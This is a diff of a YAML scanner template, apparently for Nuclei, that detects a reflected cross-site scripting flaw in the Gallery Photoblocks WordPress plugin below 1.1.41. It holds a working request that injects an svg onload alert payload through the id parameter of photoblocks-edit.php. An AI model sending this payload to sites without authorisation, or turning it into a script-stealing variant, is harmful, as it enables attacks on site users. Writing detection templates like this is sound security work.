@@ -1,5 +1,4 @@
 id: photoblocks-grid-gallery-xss
-
 info:
   name: Gallery Photoblocks < 1.1.41 - Cross-Site Scripting
   author: r3Y3r53
@@ -12,27 +11,27 @@ info:
     - https://wpscan.com/vulnerability/5c57e78a-97b9-4e23-8935-e4c9d806c89d
     - https://wordpress.org/plugins/photoblocks-grid-gallery/
   classification:
+    cwe-id:
+      - CWE-79
+      - CWE-83
     cpe: cpe:2.3:a:wpchill:gallery_photoblocks:*:*:*:*:wordpress:*:*:*
   metadata:
-    verified: true
     max-request: 1
-    vendor: wpchill
     product: gallery_photoblocks
-    publicwww-query: "/wp-content/plugins/photoblocks-grid-gallery/"
-  tags: wordpress,wpscan,photoblocks,wp-plugin,wp,xss,vuln
-
+    publicwww-query: /wp-content/plugins/photoblocks-grid-gallery/
+    vendor: wpchill
+    verified: true
+  tags: photoblocks,vuln,wordpress,wp,wp-plugin,wpscan,xss
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains(body, "<svg/onload=alert(document.domain)>")
+          - contains(body, "PhotoBlocks")
+        type: dsl
+    raw:
       - |
         GET /wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'contains(content_type, "text/html")'
-          - 'contains(body, "<svg/onload=alert(document.domain)>")'
-          - 'contains(body, "PhotoBlocks")'
-        condition: and
-
